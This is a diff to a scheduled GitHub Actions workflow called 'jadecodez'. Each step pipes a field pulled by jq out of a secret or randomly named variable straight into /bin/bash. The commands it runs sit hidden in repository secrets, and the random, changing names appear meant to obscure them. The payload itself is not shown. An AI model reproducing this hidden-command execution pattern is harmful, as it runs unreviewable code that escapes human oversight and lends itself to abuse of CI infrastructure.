@@ -1,26 +1,27 @@
 name: jadecodez
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 2/6 * * *'
+    - cron: '30 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jadecodez
         env:
-          v8: ${{ secrets.v8 }}
+          ic3230: ${{ secrets.ic3230 }}
         run: |
-          echo $v8 | jq -r .zhw0 | /bin/bash
-          echo $qyb262 | jq -r .lyi07414 | /bin/bash
-          echo $yhk74 | jq -r .ha98327 | /bin/bash
-          echo $hhqne6 | jq -r .qq559 | /bin/bash
-          echo $fl90857 | jq -r .sjecq50123 | /bin/bash
-          echo $nqpm32862 | jq -r .rmv7837 | /bin/bash
-          echo $iemr49721 | jq -r .lf973 | /bin/bash
-          echo $gyc630 | jq -r .fk02 | /bin/bash
-          echo $fl24198 | jq -r .pzk405 | /bin/bash
+          echo $ic3230 | jq -r .o180 | /bin/bash
+          echo $zm30048 | jq -r .zdp1 | /bin/bash
+          echo $yxe66742 | jq -r .pu8 | /bin/bash
+          echo $ubgt8428 | jq -r .zdls04137 | /bin/bash
+          echo $sayl63 | jq -r .x7079 | /bin/bash
+          echo $pucq932 | jq -r .xy28 | /bin/bash
+          echo $alups13 | jq -r .onfdz5 | /bin/bash
+          echo $fyc61 | jq -r .brsl91 | /bin/bash
+          echo $sevog5007 | jq -r .tdxx9207 | /bin/bash
+          echo $c7 | jq -r .pxxas700 | /bin/bash
 
